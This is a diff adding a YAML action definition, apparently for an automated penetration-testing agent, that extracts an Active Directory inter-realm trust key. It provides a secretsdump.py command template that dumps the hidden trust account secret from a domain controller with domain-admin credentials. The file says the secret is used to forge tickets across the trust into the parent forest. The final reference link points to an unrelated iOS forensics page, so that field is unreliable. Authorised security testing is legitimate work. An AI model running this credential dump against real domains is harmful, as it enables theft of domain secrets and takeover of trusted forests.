@@ -1,0 +1,36 @@
+name: trust_key_extract
+category: ad
+description: Extract inter-realm trust key (TDO secret) from a DC for cross-trust
+  ticket forging
+preconditions:
+- domain_admin
+- domain_joined
+- has_cred
+- parent_domain_trust_enum
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+command_template: secretsdump.py -just-dc-user '{trust_target_domain}$' '{domain}/{username}:{password}@{target_ip}'
+parser: secretsdump_parser
+expected_effects:
+- trust_key_extracted
+- trust_key_used
+- inter_realm_tgt_capable
+falsifier:
+  pattern: ACCESS_DENIED|ERROR_DS|account does not exist|denied
+  timeout: 60
+model_tier: sonnet
+mechanism: 'Each AD trust has an inter-realm trust object (TDO) whose secret is stored
+  as the
+
+  hidden user "<trustedDomain>$" account. With DA in the trusting domain, dump this
+
+  account to recover the inter-realm key — the krbtgt-equivalent for cross-trust
+
+  ticket forging. Combined with trust_ticket_forge to cross into the parent forest.
+
+  '
+references:
+  ocd_mindmap: 'Branch 14: Trust key extraction'
+  hacktricks: windows-hardening/active-directory-methodology/forest-and-domain-trusts.md
+hacktricks_ref: generic-methodologies-and-resources/basic-forensic-methodology/ios-backup-forensics.md
